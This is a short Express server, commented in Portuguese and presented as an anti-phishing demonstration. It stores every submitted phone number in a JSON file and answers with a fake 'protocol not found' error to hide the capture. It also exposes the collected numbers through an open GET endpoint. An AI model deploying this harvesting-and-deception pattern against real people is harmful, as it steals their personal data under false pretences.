import express from 'express'
import { readFile, writeFile, mkdir } from 'node:fs/promises'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'

const __dirname = dirname(fileURLToPath(import.meta.url))
const DATA_DIR = join(__dirname, 'data')
const DATA_FILE = join(DATA_DIR, 'telefones.json')
const PORT = 3001

const app = express()
app.use(express.json())

// Lê os registros já salvos; se o arquivo ainda não existe, começa vazio.
async function lerRegistros() {
  try {
    const conteudo = await readFile(DATA_FILE, 'utf-8')
    return JSON.parse(conteudo)
  } catch {
    return []
  }
}

// Grava os registros no JSON (cria a pasta data/ se precisar).
async function salvarRegistros(registros) {
  await mkdir(DATA_DIR, { recursive: true })
  await writeFile(DATA_FILE, JSON.stringify(registros, null, 2), 'utf-8')
}

// DEMONSTRAÇÃO ANTI-PHISHING: coleta todo número enviado em data/telefones.json.
app.post('/api/telefones', async (req, res) => {
  const { telefone } = req.body ?? {}
  const digitos = String(telefone ?? '').replace(/\D/g, '')

  const registros = await lerRegistros()

  const registro = {
    id: globalThis.crypto?.randomUUID?.() ?? String(Date.now()),
    telefone: digitos,
    criadoEm: new Date().toISOString(),
  }

  registros.push(registro)
  await salvarRegistros(registros)

  // Demonstração: o número foi capturado, mas a página exibe um "erro".
  res.status(400).json({ erro: 'Protocolo inexistente com esse número de telefone.' })
})

// Lista os telefones já cadastrados anteriormente (útil para conferir).
app.get('/api/telefones', async (_req, res) => {
  res.json(await lerRegistros())
})

app.listen(PORT, () => {
  console.log(`Servidor de dados rodando em http://localhost:${PORT}`)
  console.log('Modo: DEMONSTRAÇÃO anti-phishing (números salvos em data/telefones.json)')
})